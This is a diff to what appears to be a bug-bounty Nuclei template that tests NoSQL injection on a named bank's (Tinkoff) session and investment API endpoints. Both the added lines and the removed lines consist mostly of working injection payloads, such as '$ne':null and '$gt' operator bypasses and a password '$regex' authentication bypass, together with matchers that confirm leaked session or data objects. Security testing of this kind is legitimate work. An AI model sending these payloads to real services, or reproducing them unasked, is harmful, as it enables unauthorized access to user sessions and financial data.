@@ -4,19 +4,18 @@ info:
   name: Tinkoff - NoSQL Injection
   author: bugbounty
   severity: critical
-  description: NoSQL injection in API parameters
+  description: NoSQL injection with operator-based bypass
   tags: nosql,injection,tinkoff
+  reference:
+    - https://portswigger.net/web-security/nosql-injection
 
 http:
   - raw:
       - |
-        GET /api/common/v1/session_info?platform[$ne]=null&sessionid=test HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
         POST /api/common/v1/session_info HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
+        Accept: application/json
 
         {"platform":{"$ne":null},"sessionid":"test"}
 
@@ -24,19 +23,9 @@ http:
         POST /api/invest-gw/social/v1/post HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
+        Accept: application/json
 
-        {"id":{"$gt":""},"content":"test"}
-
-      - |
-        GET /api/invest/portfolio/instruments/v2?tickers[$regex]=.* HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        POST /api/common/v1/mobile_info HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"platform":"android","sessionid":{"$ne":""},"password":{"$regex":".*"}}
+        {"id":{"$gt":0},"limit":999}
 
     matchers-condition: and
     matchers:
@@ -46,15 +35,27 @@ http:
           - 201
 
       - type: word
-        part: body
-        words:
-          - "session"
-          - "user"
-          - "data"
-          - "portfolio"
-        condition: or
-
-      - type: word
         part: content_type
         words:
           - "application/json"
+
+      - type: regex
+        part: body
+        regex:
+          - '"session"?\s*:\s*\{[^}]+"id"?\s*:'
+          - '\[\s*\{[^}]+"id"?\s*:'
+          - '"data"?\s*:\s*\[[^\]]+\]'
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'len(body) > 100'
+
+      - type: word
+        part: body
+        words:
+          - '"error"'
+          - '"invalid"'
+          - '"forbidden"'
+        condition: or
+        negative: true
